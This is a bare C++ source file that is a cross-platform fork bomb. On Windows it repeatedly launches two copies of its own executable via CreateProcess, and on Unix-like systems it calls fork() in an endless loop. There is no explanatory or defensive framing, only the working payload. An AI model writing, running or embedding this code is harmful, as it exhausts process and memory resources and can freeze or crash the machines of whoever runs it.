#include <iostream>
#ifdef _WIN32 || _WIN64
#include <libloaderapi.h>
#include <processthreadsapi.h>
#include <synchapi.h>
#include <windows.h>
#elif __APPLE__ || __MACH__ || __linux__ || __unix__ || __unix
#include <unistd.h>
#endif


int main() {

#ifdef _WIN32 || _WIN64
    char filehely[250];
    GetModuleFileName(NULL, filehely, 250);
    /* for(int i = 0; i<250; i++){
        if(filehely[i]==0){
            break;
        }
        std::cout << filehely[i];
    }
     */
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
    CreateProcess(filehely, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    STARTUPINFO si1;
    PROCESS_INFORMATION pi1;

    ZeroMemory( &si1, sizeof(si1) );
    si1.cb = sizeof(si1);
    ZeroMemory( &pi1, sizeof(pi1) );
    CreateProcess(filehely, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si1, &pi1);

    WaitForSingleObject( pi.hProcess, INFINITE );
    #elif __APPLE__ || __MACH__ || __linux__ || __unix__ || __unix
    while(true){
        fork();
    }
#endif


    return 0;
}
